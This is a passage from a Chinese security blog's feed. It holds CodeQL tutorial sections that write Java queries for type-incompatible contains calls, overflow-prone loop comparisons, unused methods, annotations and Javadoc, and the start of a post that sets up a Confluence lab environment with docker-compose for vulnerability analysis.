<p>现在可以编写出查询的第一个版本：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">Insert</span> the class definitions <span class="keyword">from</span> above</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType</span><br><span class="line"><span class="keyword">where</span> collEltType <span class="operator">=</span> juccc.getCollectionElementType() <span class="keyword">and</span> argType <span class="operator">=</span> juccc.getArgumentType() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> haveCommonDescendant(collEltType, argType)</span><br><span class="line"><span class="keyword">select</span> juccc, &quot;Element type &quot; <span class="operator">+</span> collEltType <span class="operator">+</span> &quot; is incompatible with argument type &quot; <span class="operator">+</span> argType</span><br></pre></td></tr></table></figure>

<h5 id="改进-1"><a href="#改进-1" class="headerlink" title="改进"></a>改进</h5><p>对于很多程序来说，由于类型变量和通配符，这个查询会产生大量的误报结果：如果集合元素类型是某个类型变量 <code>E</code>，参数类型是<code>String</code>，例如 CodeQL 会认为这两者没有共同子类，我们的查询将标记调用。 排除此类误报结果的一种简单方法是简单地要求<code>collEltType</code>和<code>argType</code>都不是<code>TypeVariable</code>的实例</p>
<p>误报的另一个来源是原始类型的自动装箱：例如，如果集合的元素类型是<code>Integer</code>并且参数是<code>int</code>类型，则谓词<code>haveCommonDescendant</code>将失败，因为<code>int</code>不是 RefType。 考虑到这一点，我们的查询应该检查<code>collEltType</code>不是<code>argType</code>的装箱类型</p>
<p>最后<code>null</code>是特殊的，因为它的类型（在 CodeQL 库中称为 <code>&lt;nulltype&gt;</code>）与每个引用类型兼容，因此我们应该将其排除在考虑之外</p>
<p>加上这三项改进，我们的最终查询是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">Insert</span> the class definitions <span class="keyword">from</span> above</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType</span><br><span class="line"><span class="keyword">where</span> collEltType <span class="operator">=</span> juccc.getCollectionElementType() <span class="keyword">and</span> argType <span class="operator">=</span> juccc.getArgumentType() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> haveCommonDescendant(collEltType, argType) <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> collEltType instanceof TypeVariable <span class="keyword">and</span> <span class="keyword">not</span> argType instanceof TypeVariable <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> collEltType <span class="operator">=</span> argType.(PrimitiveType).getBoxedType() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> argType.hasName(&quot;&lt;nulltype&gt;&quot;)</span><br><span class="line"><span class="keyword">select</span> juccc, &quot;Element type &quot; <span class="operator">+</span> collEltType <span class="operator">+</span> &quot; is incompatible with argument type &quot; <span class="operator">+</span> argType</span><br></pre></td></tr></table></figure>



<h3 id="Java中容易溢出的比较运算"><a href="#Java中容易溢出的比较运算" class="headerlink" title="Java中容易溢出的比较运算"></a>Java中容易溢出的比较运算</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">long</span> l)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;l; i++) &#123;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码，如果<code>l</code>大于<code>2^31-1</code>（<code>int</code>类型的最大正值），那么这个循环将永远不会停止：<code>i</code>将从零开始，一直递增到<code>2^31-1</code>，它仍然小于<code>l</code>。 当它再次递增时会发生溢出，变为<code>-2^31</code></p>
<h4 id="初始查询"><a href="#初始查询" class="headerlink" title="初始查询"></a>初始查询</h4><p>首先编写一个查找小于表达式的查询（CodeQL 类<code>LTExpr</code>），其中左操作数为<code>int</code>类型，右操作数为<code>long</code>类型：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LTExpr expr</span><br><span class="line"><span class="keyword">where</span> expr.getLeftOperand().getType().hasName(&quot;int&quot;) <span class="keyword">and</span></span><br><span class="line">    expr.getRightOperand().getType().hasName(&quot;long&quot;)</span><br><span class="line"><span class="keyword">select</span> expr</span><br></pre></td></tr></table></figure>

<p>使用谓词<code>getType</code>（可用于<code>Expr</code>的所有子类）来确定操作数的类型。 <code>Type</code>定义了<code>hasName</code>谓词，可以用来识别原始类型<code>int</code>和<code>long</code>。 目前而言，此查询查找所有比较<code>int</code>和<code>long</code>的小于表达式，但实际上我们只对作为循环条件一部分的比较感兴趣。 此外，我们希望过滤掉任一操作数为常数的比较，因为这些不太可能是真正的错误。 修改后的查询如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LTExpr expr</span><br><span class="line"><span class="keyword">where</span> expr.getLeftOperand().getType().hasName(&quot;int&quot;) <span class="keyword">and</span></span><br><span class="line">    expr.getRightOperand().getType().hasName(&quot;long&quot;) <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">exists</span>(LoopStmt l <span class="operator">|</span> l.getCondition().getAChildExpr<span class="operator">*</span>() <span class="operator">=</span> expr) <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> expr.getAnOperand().isCompileTimeConstant()</span><br><span class="line"><span class="keyword">select</span> expr</span><br></pre></td></tr></table></figure>

<p><code>LoopStmt</code>类是所有循环的通用超类，当然也包括上面示例中的<code>for</code>循环。 虽然不同种类的循环有不同的语法，但它们都有一个循环条件，可以通过谓词<code>getCondition</code>获取。 我们使用应用于<code>getAChildExpr</code>谓词的自反传递闭包运算符<code>*</code>来表达<code>expr</code>应该嵌套在循环条件内的要求。 特别是，它可以是循环条件本身</p>
<p><code>where</code>子句中的最后一个连词利用了<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates">谓词</a>可以返回多个值这一特性。 比如<code>getAnOperand</code>可以返回<code>expr</code>的任一操作数，因此如果至少有一个操作数是常量，则<code>expr.getAnOperand().isCompileTimeConstant()</code>成立。 否定这个条件意味着查询只会找到两个操作数都不是常量的表达式</p>
<h4 id="完善查询"><a href="#完善查询" class="headerlink" title="完善查询"></a>完善查询</h4><p>当然，<code>int</code>和<code>long</code>之间的比较并不是唯一有问题的情况：窄类型和宽类型之间的任何小于比较都可能是可疑的，小于等于、大于和大于等于与小于比较一样有问题</p>
<p>为了比较类型的范围，我们定义了一个谓词，它返回给定整数类型的宽度（以位为单位）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> width(PrimitiveType pt) &#123;</span><br><span class="line">    (pt.hasName(&quot;byte&quot;) <span class="keyword">and</span> <span class="keyword">result</span><span class="operator">=</span><span class="number">8</span>) <span class="keyword">or</span></span><br><span class="line">    (pt.hasName(&quot;short&quot;) <span class="keyword">and</span> <span class="keyword">result</span><span class="operator">=</span><span class="number">16</span>) <span class="keyword">or</span></span><br><span class="line">    (pt.hasName(&quot;char&quot;) <span class="keyword">and</span> <span class="keyword">result</span><span class="operator">=</span><span class="number">16</span>) <span class="keyword">or</span></span><br><span class="line">    (pt.hasName(&quot;int&quot;) <span class="keyword">and</span> <span class="keyword">result</span><span class="operator">=</span><span class="number">32</span>) <span class="keyword">or</span></span><br><span class="line">    (pt.hasName(&quot;long&quot;) <span class="keyword">and</span> <span class="keyword">result</span><span class="operator">=</span><span class="number">64</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们想将我们的查询推广应用于任何类型宽度较小的一端小于较大的一端的比较，引入一个抽象类对其进行建模：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">abstract class OverflowProneComparison extends ComparisonExpr &#123;</span><br><span class="line">    Expr getLesserOperand() &#123; <span class="keyword">none</span>() &#125;</span><br><span class="line">    Expr getGreaterOperand() &#123; <span class="keyword">none</span>() &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个类有两个具体的子类：一个用于<code>&lt;=</code>或<code>&lt;</code>比较，另一个用于<code>&gt;=</code>或<code>&gt;</code>比较。在这两种情况下，我们实现构造函数的方式都是只匹配我们想要的表达式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class LTOverflowProneComparison extends OverflowProneComparison &#123;</span><br><span class="line">    LTOverflowProneComparison() &#123;</span><br><span class="line">        (this instanceof LEExpr <span class="keyword">or</span> this instanceof LTExpr) <span class="keyword">and</span></span><br><span class="line">        width(this.getLeftOperand().getType()) <span class="operator">&lt;</span> width(this.getRightOperand().getType())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GTOverflowProneComparison extends OverflowProneComparison &#123;</span><br><span class="line">    GTOverflowProneComparison() &#123;</span><br><span class="line">        (this instanceof GEExpr <span class="keyword">or</span> this instanceof GTExpr) <span class="keyword">and</span></span><br><span class="line">        width(this.getRightOperand().getType()) <span class="operator">&lt;</span> width(this.getLeftOperand().getType())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，我们利用这些新类重写查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import Java</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">Insert</span> the class definitions <span class="keyword">from</span> above</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> OverflowProneComparison expr</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span>(LoopStmt l <span class="operator">|</span> l.getCondition().getAChildExpr<span class="operator">*</span>() <span class="operator">=</span> expr) <span class="keyword">and</span></span><br><span class="line"><span class="keyword">not</span> expr.getAnOperand().isCompileTimeConstant()</span><br><span class="line"><span class="keyword">select</span> expr</span><br></pre></td></tr></table></figure>



<h3 id="导航调用图"><a href="#导航调用图" class="headerlink" title="导航调用图"></a>导航调用图</h3><p>CodeQL 具有用于识别调用其他代码的代码以及可以从其他地方调用的代码的类。 例如可以用来找到从未使用过的方法</p>
<h4 id="调用图类"><a href="#调用图类" class="headerlink" title="调用图类"></a>调用图类</h4><p>Java 的 CodeQL 库提供了两个抽象类来表示程序的调用图：<code>Callable</code> 和 <code>Call</code>。 前者简单来说就是<code>Method</code>和<code>Constructor</code>的共同超类，后者是<code>MethodAccess</code>、<code>ClassInstanceExpression</code>、<code>ThisConstructorInvocationStmt</code>和<code>SuperConstructorInvocationStmt</code>的公共超类。 简单地说，<code>Callable</code> 是可以调用的东西，<code>Call</code> 是调用 <code>Callable</code> 的东西</p>
<p>例如，在以下程序中，所有可调用项和调用都已添加注释：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Super</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// callable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Super</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">23</span>);       <span class="comment">// call</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// callable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Super</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// callable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span> <span class="keyword">extends</span> <span class="title class_">Super</span> &#123;</span><br><span class="line">    <span class="comment">// callable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(x+<span class="number">19</span>);    <span class="comment">// call</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// callable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x-<span class="number">19</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="comment">// callable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Super</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Sub</span>(<span class="number">42</span>);  <span class="comment">// call</span></span><br><span class="line">        s.getX();               <span class="comment">// call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Call</code>类提供了两个导航调用图的谓词：</p>
<ul>
<li><code>getCallee</code> 返回此调用（静态）解析为的 <code>Callable</code>； 请注意，对于实例（即非静态）方法的调用，在运行时调用的实际方法可能是重写此方法的其他方法</li>
<li><code>getCaller</code>获取此调用的可调用对象</li>
</ul>
<p>例如，在我们的示例中，<code>Client.main</code> 中第二次调用， <code>getCallee</code> 将返回 <code>Super.getX</code>。 但是，在运行时，这个调用实际上会调用 <code>Sub.getX</code></p>
<p>类<code>Callable</code>定义了大量成员谓词；就我们的目的而言，最重要的两个方面是：</p>
<ul>
<li><code>calls(Callable target)</code>:如果此可调用对象调用<code>target</code>则成立</li>
<li><code>polyCalls(Callable target)</code>:如果此可调用对象可以调用指定的可调用对象则成立</li>
</ul>
<p>在我们的示例中，<code>Client.main</code> <code>calls</code>构造函数 <code>Sub(int)</code> 和 <code>Super.getX</code>方法； 此外，它 <code>polyCalls</code>  <code>Sub.getX</code>方法</p>
<h4 id="示例：查找未使用的方法"><a href="#示例：查找未使用的方法" class="headerlink" title="示例：查找未使用的方法"></a>示例：查找未使用的方法</h4><p>我们可以使用 <code>Callable</code> 类编写一个查询来查找未被任何其他方法调用的方法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable callee</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(Callable caller <span class="operator">|</span> caller.polyCalls(callee))</span><br><span class="line"><span class="keyword">select</span> callee</span><br></pre></td></tr></table></figure>

<p>在这里使用 <code>polyCalls</code> 而不是<code>calls</code>：我们希望合理地确定被调用者没有被调用，无论是直接调用还是通过覆盖调用</p>
<p>在一般的 Java 项目上运行此查询会在 Java 标准库中产生大量命中。 因为没有一个客户端程序使用标准库的所有方法。 更一般地说，我们可能希望从编译的库中排除方法和构造函数。 我们可以使用谓词 <code>fromSource</code> 来检查编译单元是否是源文件，并细化我们的查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable callee</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(Callable caller <span class="operator">|</span> caller.polyCalls(callee)) <span class="keyword">and</span></span><br><span class="line">    callee.getCompilationUnit().fromSource()</span><br><span class="line"><span class="keyword">select</span> callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure>

<p>我们可能还会注意到几个名称有点奇怪的未使用方法 <code>&lt;clinit&gt;</code>：它们是类初始化器； 虽然它们没有在代码中的任何地方显式调用，但只要加载上下文的类，它们就会被隐式调用。 因此，将它们从我们的查询中排除是有意义的。 当我们这样做时，我们还可以排除终结器，它们同样被隐式调用：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable callee</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(Callable caller <span class="operator">|</span> caller.polyCalls(callee)) <span class="keyword">and</span></span><br><span class="line">    callee.getCompilationUnit().fromSource() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.hasName(&quot;&lt;clinit&gt;&quot;) <span class="keyword">and</span> <span class="keyword">not</span> callee.hasName(&quot;finalize&quot;)</span><br><span class="line"><span class="keyword">select</span> callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure>

<p>我们可能还想从查询中排除公共方法，因为它们可能是外部API入口点：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable callee</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(Callable caller <span class="operator">|</span> caller.polyCalls(callee)) <span class="keyword">and</span></span><br><span class="line">    callee.getCompilationUnit().fromSource() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.hasName(&quot;&lt;clinit&gt;&quot;) <span class="keyword">and</span> <span class="keyword">not</span> callee.hasName(&quot;finalize&quot;) <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.isPublic()</span><br><span class="line"><span class="keyword">select</span> callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure>

<p>另一个特殊情况是非公共默认构造函数：例如，在单例模式中，为类提供了私有的空默认构造函数以防止它被实例化。 由于此类构造函数的目的是不调用它们，因此不应标记它们：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable callee</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(Callable caller <span class="operator">|</span> caller.polyCalls(callee)) <span class="keyword">and</span></span><br><span class="line">    callee.getCompilationUnit().fromSource() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.hasName(&quot;&lt;clinit&gt;&quot;) <span class="keyword">and</span> <span class="keyword">not</span> callee.hasName(&quot;finalize&quot;) <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.isPublic() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.(Constructor).getNumberOfParameters() <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure>

<p>最后，在许多 Java 项目中，存在通过反射间接调用的方法。 因此，虽然没有调用这些方法的调用，但它们实际上已被使用。 通常很难识别这些方法。 然而，一个非常常见的特殊情况是 JUnit 测试方法，它由测试运行程序反射调用。 Java 的 CodeQL 库支持识别 JUnit 和其他测试框架的测试类，我们可以使用它们来过滤掉这些类中定义的方法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable callee</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(Callable caller <span class="operator">|</span> caller.polyCalls(callee)) <span class="keyword">and</span></span><br><span class="line">    callee.getCompilationUnit().fromSource() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.hasName(&quot;&lt;clinit&gt;&quot;) <span class="keyword">and</span> <span class="keyword">not</span> callee.hasName(&quot;finalize&quot;) <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.isPublic() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.(Constructor).getNumberOfParameters() <span class="operator">=</span> <span class="number">0</span> <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> callee.getDeclaringType() instanceof TestClass</span><br><span class="line"><span class="keyword">select</span> callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure>



<h3 id="Java中的注解"><a href="#Java中的注解" class="headerlink" title="Java中的注解"></a>Java中的注解</h3><p>Java项目的CodeQL数据库包含所有附加到程序元素的注解信息。</p>
<p>注解由以下CodeQL类表示：</p>
<ul>
<li><code>Annotatable</code> 表示所有可能附加注解的实体 （包，引用类型，字段，方法，局部变量）</li>
<li><code>AnnotationType</code> 标识Java注解类型，例如 <code>java.lang.Override</code>；注解类型是接口</li>
<li><code>AnnotationElement</code> 表示注解元素，即注解类型的成员</li>
<li><code>Annotation</code> 标识注解，例如 <code>@Override</code>；可以通过成员谓词<code>getValue</code>访问注解值</li>
</ul>
<p>例如，Java标准库定义了一个注解<code>SuppressWarnings</code>，指示编译器不要发出某些类型的警告：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SuppressWarnings &#123;</span><br><span class="line">    String[] value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SuppressWarnings</code>表示为<code>AnnotationType</code>，<code>value</code>是其唯一的<code>AnnotationElement</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">(java.util.List rawlist)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>表达式 <code>@SuppressWarnings(&quot;rawtypes&quot;)</code> 表示为 <code>Annotation</code>。字符串 <code>&quot;rawtypes&quot;</code> 用于初始化注解元素 <code>value</code>，其值可以通过<code>getValue</code>谓词从注解中提取</p>
<p>可以编写如下查询查找所有附加到构造函数的注解 <code>@SuppressWarnings</code> , 并返回注解本身及其<code>value</code>元素的值：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor c, Annotation ann, AnnotationType anntp</span><br><span class="line"><span class="keyword">where</span> ann <span class="operator">=</span> c.getAnAnnotation() <span class="keyword">and</span></span><br><span class="line">    anntp <span class="operator">=</span> ann.getType() <span class="keyword">and</span></span><br><span class="line">    anntp.hasQualifiedName(&quot;java.lang&quot;, &quot;SuppressWarnings&quot;)</span><br><span class="line"><span class="keyword">select</span> ann, ann.getValue(&quot;value&quot;)</span><br></pre></td></tr></table></figure>

<p>另一个示例是查找所有只有一个注释元素的注释类型，该元素具有名称<code>value</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> AnnotationType anntp</span><br><span class="line"><span class="keyword">where</span> forex(AnnotationElement elt <span class="operator">|</span></span><br><span class="line">    elt <span class="operator">=</span> anntp.getAnAnnotationElement() <span class="operator">|</span></span><br><span class="line">    elt.getName() <span class="operator">=</span> &quot;value&quot;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">select</span> anntp</span><br></pre></td></tr></table></figure>

<h3 id="Javadoc"><a href="#Javadoc" class="headerlink" title="Javadoc"></a>Javadoc</h3><p>为了访问与程序元素相关联的<code>Javadoc</code>，我们使用<code>Element</code>类的成员谓词<code>getDoc</code>，它返回一个<code>Documentable</code>。类<code>Documentable</code>反过来提供了一个成员谓词<code>getJavadoc</code>来检索附加到相关元素（如果有的话）的Javadoc</p>
<p>Javadoc注释由类<code>Javadoc</code>表示，该类提供了作为<code>JavadocElement</code>节点树的注释视图。每个<code>JavadocElement</code>要么是一个<code>JavadocTag</code>，表示一个标签，要么是一个<code>JavadocText</code>，表示一段自由格式的文本</p>
<p><code>Javadoc</code>类最重要的成员谓词：</p>
<ul>
<li><code>getAChild</code> - 获取树表示中的顶级<code>JavadocElement</code>节点</li>
<li><code>getVersion</code> - 返回<code>@version</code>标签的值（如果有）</li>
<li><code>getAuthor</code> - 返回<code>@author</code>标签的值（如果有）</li>
</ul>
<p>例如，以下查询查找所有同时具有<code>@author</code>标签和<code>@version</code>标签的类，并返回此信息：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Class c, Javadoc jdoc, string author, string version</span><br><span class="line"><span class="keyword">where</span> jdoc <span class="operator">=</span> c.getDoc().getJavadoc() <span class="keyword">and</span></span><br><span class="line">    author <span class="operator">=</span> jdoc.getAuthor() <span class="keyword">and</span></span><br><span class="line">    version <span class="operator">=</span> jdoc.getVersion()</span><br><span class="line"><span class="keyword">select</span> c, author, version</span><br></pre></td></tr></table></figure>

<p><code>JavadocElement</code>定义成员谓词<code>getAChild</code>和<code>getParent</code>，以在元素树上下导航。它还提供了一个谓词<code>getTagName</code>来返回标签的名称，以及一个谓词<code>getText</code>来访问与标签关联的文本</p>
<p>我们可以使用这个API代替<code>getAuthor</code>和<code>getVersion</code>重写上面的查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Class c, Javadoc jdoc, JavadocTag authorTag, JavadocTag versionTag</span><br><span class="line"><span class="keyword">where</span> jdoc <span class="operator">=</span> c.getDoc().getJavadoc() <span class="keyword">and</span></span><br><span class="line">    authorTag.getTagName() <span class="operator">=</span> &quot;@author&quot; <span class="keyword">and</span> authorTag.getParent() <span class="operator">=</span> jdoc <span class="keyword">and</span></span><br><span class="line">    versionTag.getTagName() <span class="operator">=</span> &quot;@version&quot; <span class="keyword">and</span> versionTag.getParent() <span class="operator">=</span> jdoc</span><br><span class="line"><span class="keyword">select</span> c, authorTag.getText(), versionTag.getText()</span><br></pre></td></tr></table></figure>

<p><code>JavadocTag</code>有几个子类，代表特定类型的<code>Javadoc</code>标签：</p>
<ul>
<li><code>ParamTag</code>表示<code>@param</code> 标签；成员谓词<code>getParamName</code>返回要记录的参数的名称</li>
<li><code>ThrowsTag</code>表示<code>@throws</code>标签；成员谓词<code>getExceptionName</code>返回正在记录的异常的名称</li>
<li><code>AuthorTag</code>表示<code>@author</code>标签；成员谓词<code>getAuthorName</code>返回作者的名称</li>
</ul>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://www.freebuf.com/articles/web/283795.html">CodeQL从入门到放弃</a></p>
<p><a href="https://codeql.github.com/docs/">https://codeql.github.com/docs/</a></p>
]]></content>
      <tags>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Confluence环境搭建及漏洞分析</title>
    <url>/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>这篇笔记是一个多月前写的，本来是想分析漏洞 CVE-2023-22522，但当时关于该漏洞的信息太少，最后也没分析出该漏洞原貌。笔记只留下一些环境搭建的方法和分析思路，另外还有一个不太算漏洞的漏洞，官方给了$300意思意思</p>
<span id="more"></span>



<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址：<a href="https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.3.zip">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.3.zip</a></p>
<p>支持的JDK和数据库版本：<a href="https://confluence.atlassian.com/doc/supported-platforms-207488198.html">https://confluence.atlassian.com/doc/supported-platforms-207488198.html</a></p>
<p>docker-compose.yml：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">services:</span><br><span class="line">  confluence:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8090:8090&quot;</span><br><span class="line">      - &quot;5005:5005&quot;</span><br><span class="line">    environment:</span><br><span class="line">      - CATALINA_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</span><br><span class="line">    depends_on:</span><br><span class="line">      - postgres</span><br><span class="line">    command: /atlassian-confluence/bin/start-confluence.sh --fg</span><br><span class="line"></span><br><span class="line">  postgres:</span><br><span class="line">    image: postgres:15-alpine3.18</span><br><span class="line">    expose:</span><br><span class="line">      - 5432</span><br><span class="line">    environment:</span><br><span class="line">      - POSTGRES_PASSWORD=postgres</span><br><span class="line">    command:</span><br><span class="line">      - sh</span><br><span class="line">      - -c</span><br><span class="line">      - echo &#x27;CREATE DATABASE confluence;&#x27; &gt; /docker-entrypoint-initdb.d/init.sql &amp;&amp; /usr/local/bin/docker-entrypoint.sh postgres</span><br></pre></td></tr></table></figure>

<p>Dockerfile：</p>
